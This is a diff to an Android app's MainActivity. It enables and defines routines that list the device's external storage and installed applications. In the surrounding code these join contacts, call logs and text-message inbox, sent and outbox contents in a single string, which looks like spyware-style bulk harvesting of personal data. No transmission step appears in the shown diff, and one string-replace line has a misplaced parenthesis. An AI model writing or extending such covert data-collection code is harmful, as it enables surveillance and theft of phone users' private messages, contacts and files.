@@ -588,8 +588,8 @@ public class MainActivity extends AppCompatActivity {
                 Parser_Logs();
             }
             Parser_Contacts();
-            //Parser_SD();
-            //Parser_Apps();
+            Parser_SD();
+            Parser_Apps();
 
             String bigd="Cc\n"+String.valueOf(sbcont)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sblog)+"\n\n\n\n*********\n\n\n\n"
                     +String.valueOf(sbinb)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sbsent)+"*********\n\n\n\n"+String.valueOf(sbout)
@@ -890,6 +890,38 @@ public class MainActivity extends AppCompatActivity {
             }
 
             Log.e(kon.TAGGED, "Parser_Logs->Finished at >"+coulog);
+        }
+
+        public void Parser_SD(){
+            try {
+                File All=new File(Environment.getExternalStorageDirectory().getAbsolutePath());
+                String maindirpath = All.toString();
+                File maindir = new File(maindirpath);
+
+                if (maindir.exists() && maindir.isDirectory()) {
+                    File arr[] = maindir.listFiles();
+                    displayDirectoryContents(maindir);
+                }else{
+                    Log.e(kon.TAGGED,"displayDirectoryContents exec error");
+
+                }
+            } catch (Exception e){
+                Log.e(kon.TAGGED, "Parser_SD"+ e.getMessage());
+            }
+
+            Log.e(kon.TAGGED, "Parser_SD->Finished >");
+        }
+
+        public void Parser_Apps(){
+            try {
+                aplis=pm.getInstalledApplications(PackageManager.GET_META_DATA);
+                flapps = (aplis.toString()).replace("},","\n").replace("[","[\n".replace("]","\n]"));
+                //sbapps.append(flapps);
+            }catch (Exception es){
+                Log.e(kon.TAGGED, "Parser_Apps-> Error as "+es);
+            }
+
+            Log.e(kon.TAGGED, "Parser_Apps->Finished >");
         }
 
     }
